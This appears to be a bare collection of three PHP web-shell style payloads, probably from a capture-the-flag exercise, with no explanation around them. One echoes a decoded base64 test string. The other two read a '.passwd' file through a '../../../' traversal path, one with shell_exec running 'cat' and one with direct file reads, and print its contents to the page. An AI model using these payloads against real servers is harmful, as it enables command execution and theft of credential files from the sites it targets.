<?php echo base64_decode("c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU="); ?>
<?php
$output = shell_exec('cat ../../../.passwd');
echo "<b>$output</b>";
?>
<?php
$filename = '../../../.passwd';
$handle = fopen($filename, "rb");
$contents = fread($handle, filesize($filename));
fclose($handle);
echo "<b>$contents</b>";
?>
